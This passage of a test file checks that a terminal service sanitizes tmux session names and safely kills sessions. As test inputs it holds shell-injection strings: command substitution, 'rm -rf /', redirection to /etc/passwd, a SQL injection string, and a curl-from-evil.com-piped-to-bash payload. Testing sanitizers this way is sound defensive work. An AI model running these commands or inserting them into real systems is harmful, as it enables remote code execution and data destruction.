      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
    })

    it('sanitizes $() for command substitution', () => {
      const sessionName = terminalService.getTmuxSessionName('agent-$(id)')
      expect(sessionName).not.toContain('$')
      expect(sessionName).not.toContain('(')
      expect(sessionName).not.toContain(')')
      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
    })

    it('sanitizes newlines that could inject new commands', () => {
      const sessionName = terminalService.getTmuxSessionName('agent-1\nrm -rf /')
      expect(sessionName).not.toContain('\n')
      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
    })

    it('sanitizes single quotes that could break out of quoted strings', () => {
      const sessionName = terminalService.getTmuxSessionName("agent-1'; drop table users;--")
      expect(sessionName).not.toContain("'")
      expect(sessionName).not.toContain(';')
      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
    })

    it('sanitizes double quotes', () => {
      const sessionName = terminalService.getTmuxSessionName('agent-1"; malicious')
      expect(sessionName).not.toContain('"')
      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
    })

    it('sanitizes greater-than for output redirection', () => {
      const sessionName = terminalService.getTmuxSessionName('agent-1 > /etc/passwd')
      expect(sessionName).not.toContain('>')
      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
    })

    it('sanitizes less-than for input redirection', () => {
      const sessionName = terminalService.getTmuxSessionName('agent-1 < /etc/passwd')
      expect(sessionName).not.toContain('<')
      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
    })

    it('only allows alphanumeric, hyphens, and underscores', () => {
      const maliciousInput = 'agent-1;|&`$(){}[]<>\\\'"\n\r\t!@#%^*=+'
      const sessionName = terminalService.getTmuxSessionName(maliciousInput)

      // Verify only safe characters remain
      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
    })

    it('handles a real-world attack payload', () => {
      // This is a common shell injection pattern
      const attackPayload = 'test"; curl http://evil.com/shell.sh | bash; echo "'
      const sessionName = terminalService.getTmuxSessionName(attackPayload)

      expect(sessionName).not.toContain(';')
      expect(sessionName).not.toContain('|')
      expect(sessionName).not.toContain('"')
      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
    })
  })

  describe('killTmuxSession - safe execution', () => {
    it('does not throw with malicious session names due to sanitization', () => {
      // The implementation uses execFileSync with argument arrays
      // Even if someone tries to inject commands, the sanitization prevents execution
      const maliciousNames = [
        'agent-1; rm -rf /',
        'agent-$(whoami)',
        'agent-`id`',
        'agent-1 && echo pwned'
      ]

      for (const name of maliciousNames) {
        // Should not throw - the name gets sanitized before being used
        expect(() => terminalService.killTmuxSession(name)).not.toThrow()
      }
    })
  })
})

